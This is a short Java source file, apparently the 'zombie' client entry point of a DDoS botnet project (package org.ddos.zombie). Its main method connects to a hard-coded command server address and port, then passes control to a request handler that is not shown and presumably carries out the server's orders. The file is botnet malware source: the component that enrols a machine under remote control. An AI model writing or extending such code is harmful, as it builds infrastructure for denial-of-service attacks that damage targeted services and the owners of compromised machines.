package org.ddos.zombie;

import java.io.EOFException;
import java.io.IOException;

import org.ddos.network.ZombieNetwork;
import org.ddos.util.ServerConstants;
import org.jnetwork.Connection;
import org.jnetwork.SocketType;

public class ZombieMain {
	public static void main(String[] args) {
		try {
			ZombieNetwork.setClient(new Connection(SocketType.DEFAULT, ServerConstants.ADDRESS, ServerConstants.PORT));
			RequestHandler.handleRequest();
		} catch (EOFException e) {
			System.out.println("Disconnected from server.");
			return;
		} catch (ClassNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}